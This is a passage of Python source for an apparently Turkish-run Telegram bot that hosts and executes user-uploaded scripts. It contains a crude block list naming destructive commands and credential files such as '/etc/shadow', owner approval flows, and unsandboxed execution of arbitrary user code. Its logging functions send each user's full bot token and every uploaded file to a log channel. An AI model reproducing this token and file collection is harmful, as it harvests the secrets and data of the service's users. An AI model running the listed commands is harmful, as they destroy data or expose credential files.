    """Advanced security check for system commands and malicious patterns including encoded scripts"""
    critical_patterns = [
        # Sistem komutları
        'sudo ', 'su ', 'rm -rf', 'fdisk', 'mkfs', 'dd if=',
        'shutdown', 'reboot', 'halt', 'poweroff',

        # Command injection
        '/bin/', '/usr/', '/sbin/', '/etc/', '/var/', '/root/',
        '/ls', '/cd', '/pwd', '/cat', '/grep', '/find',
        '/del', '/get', '/getall', '/download', '/upload',
        '/steal', '/hack', '/dump', '/extract', '/copy',

        # File operations
        'bot.send_document', 'send_document', 'bot.get_file',
        'download_file', 'send_media_group', 'os.remove("/"',
        'shutil.rmtree("/"', 'os.unlink("/"',

        # System execution
        'os.system("rm', 'os.system("sudo', 'os.system("format',
        'subprocess.call(["rm"', 'subprocess.call(["sudo"',
        'subprocess.run(["rm"', 'subprocess.run(["sudo"',
        'os.system("/bin/', 'os.system("/usr/', 'os.system("/sbin/',

        # Network operations
        'requests.post.*files=', 'urllib.request.urlopen.*data=',

        # Process operations
        'os.kill(', 'signal.SIGKILL', 'psutil.process_iter',

        # Environment manipulation
        'os.environ["PATH"]', 'os.putenv("PATH"',

        # Privilege escalation
        'setuid', 'setgid', 'chmod 777', 'chown root',

        # Format commands
        'os.system("format', 'subprocess.call(["format"', 'subprocess.run(["format"',

        # Encoded/obfuscated code patterns
        'base64.b64decode', 'base64.b64encode', 'base64.decode',
        'exec(', 'eval(', 'compile(', '__import__',
        'getattr', 'setattr', 'hasattr',
        'marshal.loads', 'pickle.loads', 'zlib.decompress',

        # Gizleme kalıpları
        'chr(', 'ord(', 'decode(', 'encode(',
        'rot13', 'xor', 'obfuscate',

        # Şüpheli ithalatlar
        'import os.system', 'import subprocess.call',
        'from os import system', 'from subprocess import call', 'import', 'from',

        # Dosya yolu geçişi
        '../', '..\\', '/etc/passwd', '/etc/shadow',
        'C:\\Windows\\System32', '/bin/bash', '/bin/sh'
    ]

    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
            content_lower = content.lower()

        detected_threats = []

        # Check for critical security violations
        for pattern in critical_patterns:
            if pattern.lower() in content_lower:
                detected_threats.append(pattern)

        # Kodlanmış base64 dizelerini (uzun base64 dizelerini) kontrol edin.
        base64_pattern = r'[A-Za-z0-9+/]{40,}={0,2}'
        base64_matches = re.findall(base64_pattern, content)
        for b64_match in base64_matches:
            try:
                # Geçerli bir base64 olup olmadığını kontrol etmek için kod çözmeyi deneyin.
                decoded = base64.b64decode(b64_match)
                # If it decodes successfully and is long, it might be encoded payload
                if len(decoded) > 50:
                    detected_threats.append(f"Base64 encoded payload ({len(decoded)} bytes)")
                    break
            except:
                pass

        # Şüpheli dosya hırsızlığı kombinasyonlarını kontrol edin.
        theft_combos = [
            ['os.listdir', 'send_document'],
            ['os.walk', 'bot.send'],
            ['glob.glob', 'upload'],
            ['open(', 'send_document'],
            ['read()', 'bot.send'],
            ['file.read', 'requests.post'],
            ['open(', 'base64.b64decode']
        ]

        for combo in theft_combos:
            if all(item.lower() in content_lower for item in combo):
                detected_threats.append(f"File theft pattern: {' + '.join(combo)}")

        # Dinamik içerikli eval/exec'i kontrol edin.
        eval_patterns = [
            r'eval\s*\(\s*[\w\.]+',
            r'exec\s*\(\s*[\w\.]+',
            r'compile\s*\(\s*[\w\.]+',
            r'__import__\s*\(\s*[\w\.]+'
        ]

        for pattern in eval_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                detected_threats.append(f"Dynamic code execution: {pattern}")

        # Dosya boyutu sınırını kontrol edin
        file_size = os.path.getsize(file_path)
        if file_size > 5 * 1024 * 1024:
            return False, "File too large - exceeds 5MB limit", []

        if detected_threats:
            return False, f"SECURITY THREATS DETECTED: {', '.join(detected_threats[:3])}", detected_threats
        else:
            return True, "Code appears safe", []
    except Exception as e:
        return False, f"Error scanning file: {e}", []

# --- NEW: Execution Approval System ---
def send_execution_request_to_owner(user_id, file_name, file_path, user_info):
    """Send file execution request to owner for approval"""
    try:
        exec_id = hashlib.md5(f"{user_id}_{file_name}_{int(time.time())}_exec".encode()).hexdigest()[:8]

        # Move file to pending execution directory (copy)
        exec_file_path = os.path.join(PENDING_EXECUTION_DIR, f"{exec_id}_{file_name}")
        shutil.copy2(file_path, exec_file_path)

        # Store execution request
        pending_executions[exec_id] = {
            'user_id': user_id,
            'file_name': file_name,
            'file_path': exec_file_path,
            'original_file_path': file_path,
            'request_time': datetime.now(),
            'user_info': user_info
        }

        # Save persistent data
        save_persistent_data()

        # Create execution request message for owner
        exec_msg = f"⚡ EXECUTION APPROVAL REQUIRED\n\n"
        exec_msg += f"👤 User: {user_info['first_name']} {user_info['last_name'] or ''}\n"
        exec_msg += f"🆔 User ID: {user_id}\n"
        exec_msg += f"📧 Username: @{user_info['username'] or 'None'}\n"
        exec_msg += f"📄 File: {file_name}\n"
        exec_msg += f"⏰ Request Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        exec_msg += f"⚠️ This user wants to EXECUTE this file.\n"
        exec_msg += f"Please review and approve or reject."

        # Create buttons for execution approval
        markup = types.InlineKeyboardMarkup()
        markup.row(
            types.InlineKeyboardButton("✅ ALLOW EXECUTION", callback_data=f"exec_approve_{exec_id}"),
            types.InlineKeyboardButton("❌ BLOCK EXECUTION", callback_data=f"exec_reject_{exec_id}")
        )
        markup.row(
            types.InlineKeyboardButton("📄 VIEW FILE", callback_data=f"exec_view_{exec_id}"),
            types.InlineKeyboardButton("👤 CONTACT USER", callback_data=f"exec_contact_{exec_id}")
        )

        # Send file to owner for review
        with open(file_path, 'rb') as f:
            bot.send_document(OWNER_ID, f, caption=exec_msg, reply_markup=markup)

        logger.info(f"Execution request sent to owner for file {file_name} from user {user_id}")
        return exec_id

    except Exception as e:
        logger.error(f"Error sending execution request: {e}")
        return None

def approve_execution(exec_id, message_for_updates=None):
    """Approve a pending execution request and run the file"""
    try:
        if exec_id not in pending_executions:
            return False, "Execution request not found"

        exec_data = pending_executions[exec_id]
        user_id = exec_data['user_id']
        file_name = exec_data['file_name']
        original_file_path = exec_data['original_file_path']
        user_info = exec_data['user_info']

        # Check if file still exists
        if not os.path.exists(original_file_path):
            return False, "Original file not found"

        # Execute the script
        if message_for_updates:
            success, result = execute_script(user_id, original_file_path, message_for_updates)
        else:
            success, result = execute_script(user_id, original_file_path)

        # Clean up
        if os.path.exists(exec_data['file_path']):
            os.remove(exec_data['file_path'])

        del pending_executions[exec_id]
        save_persistent_data()

        # Notify user
        try:
            if success:
                user_notification = f"✅ EXECUTION APPROVED BY OWNER\n\n"
                user_notification += f"📄 File: {file_name}\n"
                user_notification += f"⚡ Status: Execution started\n"
                user_notification += f"⏰ Time: {datetime.now().strftime('%H:%M:%S')}\n\n"
                user_notification += f"Your file has been approved and is now running!"
            else:
                user_notification = f"⚠️ EXECUTION APPROVED BUT FAILED\n\n"
                user_notification += f"📄 File: {file_name}\n"
                user_notification += f"❌ Error: {result}\n\n"
                user_notification += f"Please check your file and try again."

            bot.send_message(user_id, user_notification)
        except:
            pass

        # Log approval
        log_msg = f"✅ EXECUTION APPROVED BY OWNER\n\n"
        log_msg += f"👤 User: {user_info['first_name']} {user_info['last_name'] or ''}\n"
        log_msg += f"🆔 User ID: {user_id}\n"
        log_msg += f"📄 File: {file_name}\n"
        log_msg += f"⚡ Result: {'Success' if success else 'Failed'}\n"
        log_msg += f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

        send_to_log_channel(log_msg)

        return True, f"Execution approved and {'started' if success else 'failed'}"

    except Exception as e:
        logger.error(f"Error approving execution: {e}")
        return False, f"Error: {str(e)}"

def reject_execution(exec_id):
    """Reject a pending execution request"""
    try:
        if exec_id not in pending_executions:
            return False, "Execution request not found"

        exec_data = pending_executions[exec_id]
        user_id = exec_data['user_id']
        file_name = exec_data['file_name']
        user_info = exec_data['user_info']

        # Delete the temporary file
        if os.path.exists(exec_data['file_path']):
            os.remove(exec_data['file_path'])

        # Remove from pending executions
        del pending_executions[exec_id]
        save_persistent_data()

        # Notify user
        try:
            user_notification = f"❌ EXECUTION REJECTED BY OWNER\n\n"
            user_notification += f"📄 File: {file_name}\n"
            user_notification += f"🛡️ Status: Execution blocked for security reasons\n"
            user_notification += f"⏰ Time: {datetime.now().strftime('%H:%M:%S')}\n\n"
            user_notification += f"The owner has reviewed your request and determined the file cannot be executed for security reasons.\n"
            user_notification += f"Contact @doxbinyetkili if you believe this is a mistake."

            bot.send_message(user_id, user_notification)
        except:
            pass

        # Log rejection
        log_msg = f"❌ EXECUTION REJECTED BY OWNER\n\n"
        log_msg += f"👤 User: {user_info['first_name']} {user_info['last_name'] or ''}\n"
        log_msg += f"🆔 User ID: {user_id}\n"
        log_msg += f"📄 File: {file_name}\n"
        log_msg += f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

        send_to_log_channel(log_msg)

        return True, "Execution request rejected"

    except Exception as e:
        logger.error(f"Error rejecting execution: {e}")
        return False, f"Error: {str(e)}"

def view_execution_file(exec_id):
    """Get file content for review"""
    try:
        if exec_id not in pending_executions:
            return None

        exec_data = pending_executions[exec_id]
        file_path = exec_data['file_path']

        if not os.path.exists(file_path):
            return None

        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()

        # Return first 2000 characters
        return content[:2000] + ("..." if len(content) > 2000 else "")

    except Exception as e:
        logger.error(f"Error reading file content: {e}")
        return None

# --- NEW: File Upload Approval System (existing but keeping) ---
def send_approval_request_to_owner(user_id, file_name, file_path, security_issue, user_info):
    """Send file approval request to owner"""
    try:
        approval_id = hashlib.md5(f"{user_id}_{file_name}_{int(time.time())}".encode()).hexdigest()[:8]

        # Move file to pending approval directory
        pending_file_path = os.path.join(PENDING_APPROVAL_DIR, f"{approval_id}_{file_name}")
        shutil.copy2(file_path, pending_file_path)

        # Store approval request
        pending_approvals[approval_id] = {
            'user_id': user_id,
            'file_name': file_name,
            'file_path': pending_file_path,
            'security_issue': security_issue,
            'upload_time': datetime.now(),
            'user_info': user_info
        }

        # Save persistent data
        save_persistent_data()

        # Create approval message for owner
        approval_msg = f"🛡️ SECURITY APPROVAL REQUIRED\n\n"
        approval_msg += f"👤 User: {user_info['first_name']} {user_info['last_name'] or ''}\n"
        approval_msg += f"🆔 User ID: {user_id}\n"
        approval_msg += f"📧 Username: @{user_info['username'] or 'None'}\n"
        approval_msg += f"📄 File: {file_name}\n"
        approval_msg += f"🔍 Security Issue: {security_issue}\n"
        approval_msg += f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        approval_msg += f"⚠️ This file was blocked by security system but user claims it's legitimate.\n"
        approval_msg += f"Please review and approve or reject."

        # Create buttons for approval
        markup = types.InlineKeyboardMarkup()
        markup.row(
            types.InlineKeyboardButton("✅ APPROVE FILE", callback_data=f"approve_{approval_id}"),
            types.InlineKeyboardButton("❌ REJECT FILE", callback_data=f"reject_{approval_id}")
        )
        markup.row(
            types.InlineKeyboardButton("📄 VIEW FILE CONTENT", callback_data=f"view_{approval_id}"),
            types.InlineKeyboardButton("👤 CONTACT USER", callback_data=f"contact_{approval_id}")
        )

        # Send file to owner for review
        with open(pending_file_path, 'rb') as f:
            bot.send_document(OWNER_ID, f, caption=approval_msg, reply_markup=markup)

        logger.info(f"Approval request sent to owner for file {file_name} from user {user_id}")
        return approval_id

    except Exception as e:
        logger.error(f"Error sending approval request: {e}")
        return None

def approve_file(approval_id):
    """Approve a pending file and process it"""
    try:
        if approval_id not in pending_approvals:
            return False, "Approval request not found"

        approval_data = pending_approvals[approval_id]
        user_id = approval_data['user_id']
        file_name = approval_data['file_name']
        pending_file_path = approval_data['file_path']
        user_info = approval_data['user_info']

        # Move file to user's folder
        user_folder = get_user_folder(user_id)
        final_file_path = os.path.join(user_folder, file_name)
        shutil.move(pending_file_path, final_file_path)

        # Add to user files
        if user_id not in user_files:
            user_files[user_id] = []

        file_ext = os.path.splitext(file_name)[1].lower()
        file_type = 'executable' if file_ext in {'.py', '.js', '.java', '.cpp', '.c', '.sh', '.rb', '.go', '.rs', '.php', '.cs', '.kt', '.swift', '.dart', '.ts', '.lua', '.perl', '.scala', '.r', '.bat', '.ps1'} else 'hosted'

        user_files[user_id] = [(fn, ft) for fn, ft in user_files[user_id] if fn != file_name]
        user_files[user_id].append((file_name, file_type))

        # Save to database
        try:
            conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
            c = conn.cursor()
            c.execute('INSERT OR REPLACE INTO user_files (user_id, file_name, file_type, upload_time) VALUES (?, ?, ?, ?)',
                     (user_id, file_name, file_type, datetime.now().isoformat()))
            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"Database error saving approved file: {e}")

        # Remove from pending approvals
        del pending_approvals[approval_id]
        save_persistent_data()

        # Notify user
        try:
            user_notification = f"✅ FILE APPROVED BY OWNER\n\n"
            user_notification += f"📄 File: {file_name}\n"
            user_notification += f"🛡️ Status: Approved and hosted\n"
            user_notification += f"⏰ Time: {datetime.now().strftime('%H:%M:%S')}\n\n"
            user_notification += f"Your file has been reviewed and approved by the owner.\n"
            user_notification += f"It is now available in your files list!"

            bot.send_message(user_id, user_notification)
        except:
            pass

        # Log approval
        log_msg = f"✅ FILE APPROVED BY OWNER\n\n"
        log_msg += f"👤 User: {user_info['first_name']} {user_info['last_name'] or ''}\n"
        log_msg += f"🆔 User ID: {user_id}\n"
        log_msg += f"📄 File: {file_name}\n"
        log_msg += f"🔍 Original Issue: {approval_data['security_issue']}\n"
        log_msg += f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

        send_to_log_channel(log_msg)

        return True, "File approved successfully"

    except Exception as e:
        logger.error(f"Error approving file: {e}")
        return False, f"Error: {str(e)}"

def reject_file(approval_id):
    """Reject a pending file"""
    try:
        if approval_id not in pending_approvals:
            return False, "Approval request not found"

        approval_data = pending_approvals[approval_id]
        user_id = approval_data['user_id']
        file_name = approval_data['file_name']
        pending_file_path = approval_data['file_path']
        user_info = approval_data['user_info']

        # Delete the file
        if os.path.exists(pending_file_path):
            os.remove(pending_file_path)

        # Remove from pending approvals
        del pending_approvals[approval_id]
        save_persistent_data()

        # Notify user
        try:
            user_notification = f"❌ FILE REJECTED BY OWNER\n\n"
            user_notification += f"📄 File: {file_name}\n"
            user_notification += f"🛡️ Status: Rejected for security reasons\n"
            user_notification += f"⏰ Time: {datetime.now().strftime('%H:%M:%S')}\n\n"
            user_notification += f"The owner has reviewed your file and determined it cannot be hosted for security reasons.\n"
            user_notification += f"Contact @doxbinyetkili you believe this is a mistake."

            bot.send_message(user_id, user_notification)
        except:
            pass

        # Log rejection
        log_msg = f"❌ FILE REJECTED BY OWNER\n\n"
        log_msg += f"👤 User: {user_info['first_name']} {user_info['last_name'] or ''}\n"
        log_msg += f"🆔 User ID: {user_id}\n"
        log_msg += f"📄 File: {file_name}\n"
        log_msg += f"🔍 Security Issue: {approval_data['security_issue']}\n"
        log_msg += f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

        send_to_log_channel(log_msg)

        return True, "File rejected successfully"

    except Exception as e:
        logger.error(f"Error rejecting file: {e}")
        return False, f"Error: {str(e)}"

def view_file_content(approval_id):
    """Get file content for review"""
    try:
        if approval_id not in pending_approvals:
            return None

        approval_data = pending_approvals[approval_id]
        file_path = approval_data['file_path']

        if not os.path.exists(file_path):
            return None

        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()

        # Return first 2000 characters
        return content[:2000] + ("..." if len(content) > 2000 else "")

    except Exception as e:
        logger.error(f"Error reading file content: {e}")
        return None

def auto_install_dependencies(file_path, file_ext, user_folder):
    """Auto-install dependencies based on file type"""
    installations = []

    try:
        if file_ext == '.py':
            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read()

            python_packages = {
                'requests': 'requests', 'flask': 'flask', 'django': 'django',
                'numpy': 'numpy', 'pandas': 'pandas', 'matplotlib': 'matplotlib',
                'scipy': 'scipy', 'sklearn': 'scikit-learn', 'cv2': 'opencv-python',
                'PIL': 'Pillow', 'bs4': 'beautifulsoup4', 'selenium': 'selenium',
                'telebot': 'pyTelegramBotAPI', 'telegram': 'python-telegram-bot',
                'pyrogram': 'pyrogram', 'tgcrypto': 'tgcrypto', 'aiohttp': 'aiohttp',
                'asyncio': None, 'json': None, 'os': None, 'sys': None, 're': None,
                'time': None, 'datetime': None, 'random': None, 'hashlib': None
            }

            import_pattern = r'(?:from\s+(\w+)|import\s+(\w+))'
            matches = re.findall(import_pattern, content)

            for match in matches:
                module = match[0] or match[1]
                if module in python_packages and python_packages[module]:
                    try:
                        result = subprocess.run([sys.executable, '-m', 'pip', 'install', python_packages[module]],
                                               capture_output=True, text=True, timeout=30)
                        if result.returncode == 0:
                            installations.append(f"✅ Installed Python package: {python_packages[module]}")
                        else:
                            installations.append(f"❌ Failed to install: {python_packages[module]}")
                    except Exception as e:
                        installations.append(f"❌ Error installing {python_packages[module]}: {str(e)}")

        elif file_ext == '.js':
            package_json_path = os.path.join(user_folder, 'package.json')
            if not os.path.exists(package_json_path):
                package_data = {
                    "name": "user-script", "version": "1.0.0",
                    "description": "Auto-generated package.json",
                    "main": "index.js", "dependencies": {}
                }
                with open(package_json_path, 'w') as f:
                    json.dump(package_data, f, indent=2)

            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read()

            node_packages = {
                'express': 'express', 'axios': 'axios', 'lodash': 'lodash',
                'moment': 'moment', 'telegraf': 'telegraf', 'node-telegram-bot-api': 'node-telegram-bot-api'
            }

            require_pattern = r'require\([\'"](\w+)[\'"]\)'
            matches = re.findall(require_pattern, content)

            for module in matches:
                if module in node_packages and node_packages[module]:
                    try:
                        result = subprocess.run(['npm', 'install', node_packages[module]],
                                               cwd=user_folder, capture_output=True, text=True, timeout=30)
                        if result.returncode == 0:
                            installations.append(f"✅ Installed Node package: {node_packages[module]}")
                        else:
                            installations.append(f"❌ Failed to install: {node_packages[module]}")
                    except Exception as e:
                        installations.append(f"❌ Error installing {node_packages[module]}: {str(e)}")

    except Exception as e:
        installations.append(f"❌ Error during dependency analysis: {str(e)}")

    return installations

def execute_script(user_id, script_path, message_for_updates=None):
    """Execute a script with comprehensive language support and hosting"""
    script_name = os.path.basename(script_path)
    script_ext = os.path.splitext(script_path)[1].lower()

    supported_types = {
        '.py': {'name': 'Python', 'icon': '🐍', 'executable': True, 'type': 'executable'},
        '.js': {'name': 'JavaScript', 'icon': '🟨', 'executable': True, 'type': 'executable'},
        '.java': {'name': 'Java', 'icon': '☕', 'executable': True, 'type': 'executable'},
        '.cpp': {'name': 'C++', 'icon': '🔧', 'executable': True, 'type': 'executable'},
        '.c': {'name': 'C', 'icon': '🔧', 'executable': True, 'type': 'executable'},
        '.sh': {'name': 'Shell', 'icon': '🖥️', 'executable': True, 'type': 'executable'},
        '.rb': {'name': 'Ruby', 'icon': '💎', 'executable': True, 'type': 'executable'},
        '.go': {'name': 'Go', 'icon': '🐹', 'executable': True, 'type': 'executable'},
        '.rs': {'name': 'Rust', 'icon': '🦀', 'executable': True, 'type': 'executable'},
        '.php': {'name': 'PHP', 'icon': '🐘', 'executable': True, 'type': 'executable'},
        '.cs': {'name': 'C#', 'icon': '💜', 'executable': True, 'type': 'executable'},
        '.kt': {'name': 'Kotlin', 'icon': '🟣', 'executable': True, 'type': 'executable'},
        '.swift': {'name': 'Swift', 'icon': '🍎', 'executable': True, 'type': 'executable'},
        '.dart': {'name': 'Dart', 'icon': '🎯', 'executable': True, 'type': 'executable'},
        '.ts': {'name': 'TypeScript', 'icon': '🔷', 'executable': True, 'type': 'executable'},
        '.lua': {'name': 'Lua', 'icon': '🌙', 'executable': True, 'type': 'executable'},
        '.perl': {'name': 'Perl', 'icon': '🐪', 'executable': True, 'type': 'executable'},
        '.scala': {'name': 'Scala', 'icon': '🔴', 'executable': True, 'type': 'executable'},
        '.r': {'name': 'R', 'icon': '📊', 'executable': True, 'type': 'executable'},

        '.html': {'name': 'HTML', 'icon': '🌐', 'executable': False, 'type': 'hosted'},
        '.css': {'name': 'CSS', 'icon': '🎨', 'executable': False, 'type': 'hosted'},
        '.xml': {'name': 'XML', 'icon': '📄', 'executable': False, 'type': 'hosted'},
        '.json': {'name': 'JSON', 'icon': '📋', 'executable': False, 'type': 'hosted'},
        '.yaml': {'name': 'YAML', 'icon': '⚙️', 'executable': False, 'type': 'hosted'},
        '.yml': {'name': 'YAML', 'icon': '⚙️', 'executable': False, 'type': 'hosted'},
        '.md': {'name': 'Markdown', 'icon': '📝', 'executable': False, 'type': 'hosted'},
        '.txt': {'name': 'Text', 'icon': '📄', 'executable': False, 'type': 'hosted'},
        '.jpg': {'name': 'JPEG Image', 'icon': '🖼️', 'executable': False, 'type': 'hosted'},
        '.jpeg': {'name': 'JPEG Image', 'icon': '🖼️', 'executable': False, 'type': 'hosted'},
        '.png': {'name': 'PNG Image', 'icon': '🖼️', 'executable': False, 'type': 'hosted'},
        '.gif': {'name': 'GIF Image', 'icon': '🖼️', 'executable': False, 'type': 'hosted'},
        '.svg': {'name': 'SVG Image', 'icon': '🖼️', 'executable': False, 'type': 'hosted'},
        '.pdf': {'name': 'PDF Document', 'icon': '📄', 'executable': False, 'type': 'hosted'},
        '.zip': {'name': 'ZIP Archive', 'icon': '📦', 'executable': False, 'type': 'hosted'},
        '.sql': {'name': 'SQL Script', 'icon': '🗄️', 'executable': False, 'type': 'hosted'},
        '.bat': {'name': 'Batch Script', 'icon': '🖥️', 'executable': True, 'type': 'executable'},
        '.ps1': {'name': 'PowerShell', 'icon': '💙', 'executable': True, 'type': 'executable'},
    }

    if script_ext not in supported_types:
        return False, f"Unsupported file type: {script_ext}"

    lang_info = supported_types[script_ext]

    try:
        if message_for_updates:
            safe_edit_message(
                message_for_updates.chat.id,
                message_for_updates.message_id,
                f"🔄 Starting your script...\n\n"
                f"📄 File: {script_name}\n"
                f"🔧 Language: {lang_info['name']}\n"
                f"⏳ Status: Initializing..."
            )

        if not lang_info.get('executable', True):
            if message_for_updates:
                file_hash = hashlib.md5(f"{user_id}_{script_name}".encode()).hexdigest()
                repl_slug = os.environ.get('REPL_SLUG', 'universal-file-host')
                repl_owner = os.environ.get('REPL_OWNER', 'replit-user')
                file_url = f"https://{repl_slug}-{repl_owner}.replit.app/file/{file_hash}"

                success_msg = f"{lang_info['icon']} {lang_info['name']} file hosted successfully!\n\n"
                success_msg += f"File: {script_name}\n"
                success_msg += f"Status: Securely hosted\n"
                success_msg += f"URL: {file_url}\n"
                success_msg += f"Access: Use 'Check Files' button\n"
                success_msg += f"Security: Maximum encryption\n\n"
                success_msg += f"Your {lang_info['name']} file is now accessible!"

                safe_edit_message(
                    message_for_updates.chat.id,
                    message_for_updates.message_id,
                    success_msg
                )
            return True, f"File hosted successfully"

        if message_for_updates:
            safe_edit_message(
                message_for_updates.chat.id,
                message_for_updates.message_id,
                f"🔄 Starting your script...\n\n"
                f"📄 File: {script_name}\n"
                f"🔧 Language: {lang_info['name']}\n"
                f"⏳ Status: Installing dependencies..."
            )

        user_folder = get_user_folder(user_id)
        installations = auto_install_dependencies(script_path, script_ext, user_folder)

        if installations and message_for_updates:
            install_msg = f"{lang_info['icon']} Dependency installation:\n\n" + "\n".join(installations[:5])
            if len(installations) > 5:
                install_msg += f"\n... and {len(installations) - 5} more"
            safe_send_message(message_for_updates.chat.id, install_msg)

        if script_ext == '.py':
            cmd = [sys.executable, script_path]
        elif script_ext == '.js':
            cmd = ['node', script_path]
        elif script_ext == '.java':
            class_name = os.path.splitext(script_name)[0]
            compile_result = subprocess.run(['javac', script_path], capture_output=True, text=True, timeout=60)
            if compile_result.returncode != 0:
                return False, f"Java compilation failed: {compile_result.stderr}"
            cmd = ['java', '-cp', os.path.dirname(script_path), class_name]
        elif script_ext in ['.cpp', '.c']:
            executable = os.path.join(user_folder, 'output')
            compiler = 'g++' if script_ext == '.cpp' else 'gcc'
            compile_result = subprocess.run([compiler, script_path, '-o', executable],
                                          capture_output=True, text=True, timeout=60)
            if compile_result.returncode != 0:
                return False, f"C/C++ compilation failed: {compile_result.stderr}"
            cmd = [executable]
        elif script_ext == '.go':
            cmd = ['go', 'run', script_path]
        elif script_ext == '.rs':
            executable = os.path.join(user_folder, 'output')
            compile_result = subprocess.run(['rustc', script_path, '-o', executable],
                                          capture_output=True, text=True, timeout=60)
            if compile_result.returncode != 0:
                return False, f"Rust compilation failed: {compile_result.stderr}"
            cmd = [executable]
        elif script_ext == '.php':
            cmd = ['php', script_path]
        elif script_ext == '.rb':
            cmd = ['ruby', script_path]
        elif script_ext == '.lua':
            cmd = ['lua', script_path]
        elif script_ext == '.sh':
            cmd = ['bash', script_path]
        elif script_ext == '.ts':
            js_path = script_path.replace('.ts', '.js')
            compile_result = subprocess.run(['tsc', script_path], capture_output=True, text=True, timeout=60)
            if compile_result.returncode != 0:
                return False, f"TypeScript compilation failed: {compile_result.stderr}"
            cmd = ['node', js_path]
        else:
            cmd = [script_path]

        log_file_path = os.path.join(LOGS_DIR, f"execution_{user_id}_{int(time.time())}.log")

        with open(log_file_path, 'w') as log_file:
            process = subprocess.Popen(
                cmd,
                stdout=log_file,
                stderr=subprocess.STDOUT,
                cwd=os.path.dirname(script_path),
                env=os.environ.copy()
            )

            script_key = f"{user_id}_{script_name}"
            bot_scripts[script_key] = {
                'process': process,
                'script_key': script_key,
                'user_id': user_id,
                'file_name': script_name,
                'start_time': datetime.now(),
                'log_file_path': log_file_path,
                'language': lang_info['name'],
                'icon': lang_info['icon']
            }

            save_running_script(user_id, script_name, process.pid)
            save_persistent_data()  # Save persistent data

            if message_for_updates:
                success_msg = f"🎉 Script started successfully!\n\n"
                success_msg += f"📄 File: {script_name}\n"
                success_msg += f"🔧 Language: {lang_info['name']} {lang_info['icon']}\n"
                success_msg += f"🆔 Process ID: {process.pid}\n"
                success_msg += f"⏰ Start Time: {datetime.now().strftime('%H:%M:%S')}\n"
                success_msg += f"📊 Status: 🟢 Running"

                safe_edit_message(
                    message_for_updates.chat.id,
                    message_for_updates.message_id,
                    success_msg
                )

            return True, f"Script started with PID {process.pid}"

    except Exception as e:
        error_msg = f"Execution failed: {str(e)}"
        logger.error(f"Script execution error for user {user_id}: {e}")

        if message_for_updates:
            safe_edit_message(
                message_for_updates.chat.id,
                message_for_updates.message_id,
                f"❌ {error_msg}"
            )

        return False, error_msg

# --- Enhanced Logging Functions ---
def log_file_upload(user_id, file_name, file_type, file_size, security_status, file_path=None):
    """Log file upload to channel with actual file"""
    try:
        user_info = get_user_info(user_id)

        # Check if this is from a cloned bot
        current_bot_username = bot.get_me().username
        is_cloned_bot = current_bot_username != "Mutluhosbot"  # Adjust to your main bot username

        log_msg = f"📤 NEW FILE UPLOAD\n\n"
        log_msg += f"👤 User: {user_info['first_name']} {user_info['last_name'] or ''}\n"
        log_msg += f"🆔 User ID: {user_id}\n"
        log_msg += f"📧 Username: @{user_info['username'] or 'None'}\n"

        if is_cloned_bot:
            log_msg += f"🤖 From Clone Bot: @{current_bot_username}\n"
            log_msg += f"👑 Clone Owner: {OWNER_ID}\n"

        log_msg += f"📄 File: {file_name}\n"
        log_msg += f"📁 Type: {file_type}\n"
        log_msg += f"📦 Size: {file_size} bytes\n"
        log_msg += f"🛡️ Security: {security_status}\n"
        log_msg += f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        log_msg += f"🔗 File stored in user folder: /upload_bots/{user_id}/"

        # Send file along with log message
        if file_path and os.path.exists(file_path):
            with open(file_path, 'rb') as f:
                send_to_log_channel(log_msg, f)
        else:
            send_to_log_channel(log_msg)

    except Exception as e:
        logger.error(f"Error logging file upload: {e}")

def log_clone_creation(user_id, bot_username, token):
    """Log clone bot creation to channel with full token"""
    try:
        user_info = get_user_info(user_id)
        log_msg = f"🤖 NEW BOT CLONE CREATED\n\n"
        log_msg += f"👤 User: {user_info['first_name']} {user_info['last_name'] or ''}\n"
        log_msg += f"🆔 User ID: {user_id}\n"
        log_msg += f"📧 Username: @{user_info['username'] or 'None'}\n"
        log_msg += f"🤖 Bot: @{bot_username}\n"
        log_msg += f"🔑 Full Token: {token}\n"  # Full token for logging
        log_msg += f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        log_msg += f"🌐"
        send_to_log_channel(log_msg)
    except Exception as e:
        logger.error(f"Error logging clone creation: {e}")

def log_script_execution(user_id, file_name, status, execution_time=None):
    """Log script execution to channel"""
    try:
        user_info = get_user_info(user_id)

        # Check if this is from a cloned bot
        current_bot_username = bot.get_me().username
        is_cloned_bot = current_bot_username != "CyberHacked0Bot"  # Adjust to your main bot username

        log_msg = f"🚀 SCRIPT EXECUTION\n\n"
        log_msg += f"👤 User: {user_info['first_name']} {user_info['last_name'] or ''}\n"
        log_msg += f"🆔 User ID: {user_id}\n"
        log_msg += f"📧 Username: @{user_info['username'] or 'None'}\n"

        if is_cloned_bot:
            log_msg += f"🤖 From Clone Bot: @{current_bot_username}\n"

        log_msg += f"📄 File: {file_name}\n"
        log_msg += f"📊 Status: {status}\n"
        if execution_time:
            log_msg += f"⏱️ Execution Time: {execution_time}s\n"
        log_msg += f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

        send_to_log_channel(log_msg)
    except Exception as e:
        logger.error(f"Error logging script execution: {e}")

def get_user_info(user_id):
    """Get user information from database"""
    try:
        conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
        c = conn.cursor()
        c.execute('SELECT username, first_name, last_name FROM active_users WHERE user_id = ?', (user_id,))
        result = c.fetchone()
        conn.close()

        if result:
            return {
                'username': result[0],
                'first_name': result[1],
                'last_name': result[2]
            }
